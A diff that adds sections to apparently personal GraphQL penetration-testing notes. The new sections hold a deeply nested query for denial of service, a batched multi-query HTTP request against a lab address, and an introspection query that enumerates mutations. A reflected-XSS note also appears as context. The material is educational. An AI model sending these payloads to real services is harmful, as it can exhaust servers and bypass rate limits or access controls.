@@ -2,6 +2,9 @@
 - [Introduction](#introduction)
 - [Introspection](#introspection)
 - [Injection Attacks](#injection-attacks)
+- [Denial-of-Service (DoS) & Batching Attacks](#denial-of-service-dos--batching-attacks)
+- [Mutations](#mutations)
+
 
 
 ## Introduction
@@ -202,3 +205,158 @@ query IntrospectionQuery {
 
 - XSS vulnerabilities can also occur if invalid arguments are reflected in error messages. Let us look at the post query, which expects an integer ID as an argument. If we instead submit a string argument containing an XSS payload, we can see that the XSS payload is reflected without proper encoding in the GraphQL error message:
 [xss](/images/xss.jpg)
+
+
+## Denial-of-Service (DoS) & Batching Attacks
+- Example of DOS:
+```graphql
+{
+  posts {
+    author {
+      posts {
+        edges {
+          node {
+            author {
+              posts {
+                edges {
+                  node {
+                    author {
+                      posts {
+                        edges {
+                          node {
+                            author {
+                              posts {
+                                edges {
+                                  node {
+                                    author {
+                                      posts {
+                                        edges {
+                                          node {
+                                            author {
+                                              posts {
+                                                edges {
+                                                  node {
+                                                    author {
+                                                      posts {
+                                                        edges {
+                                                          node {
+                                                            author {
+                                                              posts {
+                                                                edges {
+                                                                  node {
+                                                                    author {
+                                                                      username
+                                                                    }
+                                                                  }
+                                                                }
+                                                              }
+                                                            }
+                                                          }
+                                                        }
+                                                      }
+                                                    }
+                                                  }
+                                                }
+                                              }
+                                            }
+                                          }
+                                        }
+                                      }
+                                    }
+                                  }
+                                }
+                              }
+                            }
+                          }
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+```
+
+- **Batching Attacks**
+    - Batching in GraphQL refers to executing multiple queries with a single request. We can do so by directly supplying multiple queries in a JSON list in the HTTP request. For instance, we can query the ID of the user admin and the title of the first post in a single request:
+```http
+POST /graphql HTTP/1.1
+Host: 172.17.0.2
+Content-Length: 86
+Content-Type: application/json
+
+[
+    {
+        "query":"{user(username: \"admin\") {uuid}}"
+    },
+    {
+        "query":"{post(id: 1) {title}}"
+    }
+]
+```
+
+
+## Mutations
+- Mutations are GraphQL queries that modify server data. They can be used to create new objects, update existing objects, or delete existing objects.
+
+- Let us start by identifying all mutations supported by the backend and their arguments. We will use the following introspection query:
+```graphql
+query {
+  __schema {
+    mutationType {
+      name
+      fields {
+        name
+        args {
+          name
+          defaultValue
+          type {
+            ...TypeRef
+          }
+        }
+      }
+    }
+  }
+}
+
+fragment TypeRef on __Type {
+  kind
+  name
+  ofType {
+    kind
+    name
+    ofType {
+      kind
+      name
+      ofType {
+        kind
+        name
+        ofType {
+          kind
+          name
+          ofType {
+            kind
+            name
+            ofType {
+              kind
+              name
+              ofType {
+                kind
+                name
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
+
